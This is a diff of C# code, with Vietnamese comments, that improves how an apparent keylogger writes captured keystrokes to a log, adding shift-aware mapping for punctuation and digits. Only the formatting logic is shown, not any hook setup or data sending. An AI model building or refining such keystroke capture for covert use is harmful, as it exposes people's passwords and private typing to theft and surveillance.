@@ -136,9 +136,9 @@ namespace WebSocketTest // Đổi namespace cho trùng với project Server
                             switch ((Keys)vkCode)
                             {
                                 case Keys.Space: sw.Write(" "); break;
-                                case Keys.Return: sw.Write("[ENTER]"); break;
-                                case Keys.Back: sw.Write("[BS]"); break;
-                                case Keys.Tab: sw.Write("[TAB]"); break;
+                                case Keys.Return: sw.Write("\n"); break;
+                                case Keys.Back: sw.Write("[Backspace]"); break;
+                                case Keys.Tab: sw.Write("\t"); break;
                                 default:
                                     // Logic xử lý chữ hoa/thường
                                     if (key.Length == 1) // Ký tự A-Z, 0-9
@@ -148,7 +148,34 @@ namespace WebSocketTest // Đổi namespace cho trùng với project Server
                                     }
                                     else
                                     {
-                                        sw.Write($"[{key}]");
+                                        switch (key)
+                                        {
+                                            case "OemPeriod": sw.Write("."); break;
+                                            case "Oemcomma": sw.Write(","); break;
+                                            case "OemMinus": sw.Write(shift ? "_" : "-"); break;
+                                            case "OemPlus": sw.Write(shift ? "+" : "="); break;
+                                            case "OemSemicolon": sw.Write(shift ? ":" : ";"); break;
+                                            case "Oem2": sw.Write(shift ? "?" : "/"); break;
+                                            case "Oem3": sw.Write(shift ? "~" : "`"); break;
+                                            case "Oem4": sw.Write(shift ? "{" : "["); break;
+                                            case "OemPipe": sw.Write(shift ? "|" : "\\"); break;
+                                            case "Oem6": sw.Write(shift ? "}" : "]"); break;
+                                            case "OemQuotes": sw.Write(shift ? "\"" : "'"); break;
+                                            case "D0": sw.Write(shift ? ")" : "0"); break;
+                                            case "D1": sw.Write(shift ? "!" : "1"); break;
+                                            case "D2": sw.Write(shift ? "@" : "2"); break;
+                                            case "D3": sw.Write(shift ? "#" : "3"); break;
+                                            case "D4": sw.Write(shift ? "$" : "4"); break;
+                                            case "D5": sw.Write(shift ? "%" : "5"); break;
+                                            case "D6": sw.Write(shift ? "^" : "6"); break;
+                                            case "D7": sw.Write(shift ? "&" : "7"); break;
+                                            case "D8": sw.Write(shift ? "*" : "8"); break;
+                                            case "D9": sw.Write(shift ? "(" : "9"); break;
+                                            default:
+                                                // Ghi tên phím khác dưới dạng [KeyName]
+                                                sw.Write($"[{key}]");
+                                                break;
+                                        }
                                     }
                                     break;
                             }
